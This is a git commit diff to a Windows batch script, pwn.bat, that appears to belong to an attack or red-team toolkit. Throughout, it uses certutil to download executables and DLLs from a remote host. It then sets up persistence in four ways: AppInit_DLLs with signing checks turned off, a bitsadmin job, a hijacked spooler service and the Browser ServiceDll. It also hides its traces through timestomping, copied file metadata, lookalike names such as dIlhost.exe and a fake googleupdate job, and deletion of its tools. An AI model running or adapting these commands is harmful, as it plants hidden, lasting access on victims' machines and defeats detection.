1567ca96fd99ed07af6006663ca9be8240f8387e
phillip@ironrain.org <smitty@localhost.localdomain>
2018-12-12 20:11:53 -0500

    remove junk

--- pwn/windows/pwn.bat
+++ pwn/windows/pwn.bat
@@ -10,58 +10,76 @@ REM 64-bit
 mkdir c:\temp
 cd \temp
 certutil.exe -urlcache -split -f "http://10.5.9.9:9983/touch.exe" touch.exe
+certutil.exe -urlcache -split -f "http://10.5.9.9:9983/ditto.exe" ditto.exe
 certutil.exe -urlcache -split -f "http://10.5.9.9:9983/updll64.dll" updll64.dll
 certutil.exe -urlcache -split -f "http://10.5.9.9:9983/updll32.dll" updll32.dll
+ditto.exe c:\windows\system32\sxs.dll updll64.dll
+ditto.exe c:\windows\system32\sxs.dll updll32.dll
 touch -t 201308220431 -- c:\temp\updll64.dll
+touch -t 201308220431 -- c:\temp\updll32.dll
+del ditto.exe
 del touch.exe
-move /y updll64.dll c:\windows\system32
-reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" /v AppInit_DLLs /d "updll64.dll" /f
+move /y updll64.dll c:\windows\system32\sxsrv.dll
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" /v AppInit_DLLs /d "sxsrv.dll" /f
 reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" /v RequireSignedAppInit_DLLs /t REG_DWORD /d 0 /f
 reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" /v LoadAppInit_DLLs /t REG_DWORD /d 1 /f
 REM 32-bit
-touch -t 201308220431 -- c:\temp\updll32.dll
-move /y updll32.dll c:\windows\syswow64
-reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Windows" /v AppInit_DLLs /d "updll32.dll" /f
+move /y updll32.dll c:\windows\syswow64\sxsrv.dll
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Windows" /v AppInit_DLLs /d "sxsrv.dll" /f
 reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Windows" /v RequireSignedAppInit_DLLs /t REG_DWORD /d 0 /f
 reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Windows" /v LoadAppInit_DLLs /t REG_DWORD /d 1 /f
 GOTO DEFAULT
 
 :CASE_bitsadmin
-SET SERVICENAME=blark
+SET SERVICENAME=googleupdate
 REM bitsadmin persistance
 mkdir c:\temp
 cd \temp
 certutil.exe -urlcache -split -f "http://10.5.9.9:9983/up.exe" up.exe
+certutil.exe -urlcache -split -f "http://10.5.9.9:9983/ditto.exe" ditto.exe
+ditto.exe c:\windows\system32\dllhost.exe up.exe
 touch -t 201308220431 -- c:\temp\up.exe
-move up.exe c:\windows\
+del touch.exe
+del ditto.exe
+move /y up.exe c:\windows\system32\dIlhost.exe
 bitsadmin /rawreturn /reset
 bitsadmin /rawreturn /create %SERVICENAME%
 bitsadmin /rawreturn /addfile %SERVICENAME% c:\windows\system32\user32.dll c:\users\public\documents\user32.gif
-bitsadmin /rawreturn /setnotifycmdline TEST c:\windows\up.exe NULL
+bitsadmin /rawreturn /setnotifycmdline %SERVICENAME% c:\windows\system32\dIlhost.exe NULL
 bitsadmin /rawreturn /setpriority %SERVICENAME% high
 bitsadmin /rawreturn /resume %SERVICENAME%
 GOTO DEFAULT
 
 :CASE_service
 REM service persistence
-SET SERVICENAME=blark
-SET SERVICEDESC=blark
-sc delete %SERVICENAME%
-sc create %SERVICENAME% binpath= c:\temp\bad2222.exe error= ignore start= auto DisplayName= blark
-sc description %SERVICENAME% %SERVICEDESC%
+SET SERVICENAME=spooler
+mkdir c:\temp
+cd \temp
+certutil.exe -urlcache -split -f "http://10.5.9.9:9983/up.exe" up.exe
+certutil.exe -urlcache -split -f "http://10.5.9.9:9983/ditto.exe" ditto.exe
+ditto.exe c:\windows\system32\spoolsv.exe up.exe
+touch -t 201308220431 -- c:\temp\up.exe
+del ditto.exe
+del touch.exe
+move /y up.exe c:\windows\system32\spoolsvc.exe
+sc stop %SERVICENAME%
+sc config %SERVICENAME% binpath= c:\windows\system32\spoolsvc.exe
 sc start %SERVICENAME%
 GOTO DEFAULT
 
-:CASE_servicedll
+:CASE_sdll
 sc stop Browser
 mkdir c:\temp
 cd \temp
 certutil.exe -urlcache -split -f "http://10.5.9.9:9983/touch.exe" touch.exe
+certutil.exe -urlcache -split -f "http://10.5.9.9:9983/ditto.exe" ditto.exe
 certutil.exe -urlcache -split -f "http://10.5.9.9:9983/updll64.dll" updll64.dll
+ditto.exe c:\windows\system32\crypt32.dll updll64.dll
 touch -t 201308220431 -- c:\temp\updll64.dll
 del touch.exe
-move /y updll64.dll c:\windows\system32
-reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Browser\Parameters" /v ServiceDll /t REG_EXPAND_SZ /d "c:\windows\system32\updll64.dll" /f
+del ditto.exe
+move /y updll64.dll c:\windows\system32\crypt.dll
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Browser\Parameters" /v ServiceDll /t REG_EXPAND_SZ /d "c:\windows\system32\crypt.dll" /f
 reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Browser" /v Start /t REG_DWORD /d 2 /f
 reg delete "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Browser\TriggerInfo" /f
 reg delete "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Browser" /v DependOnService /f
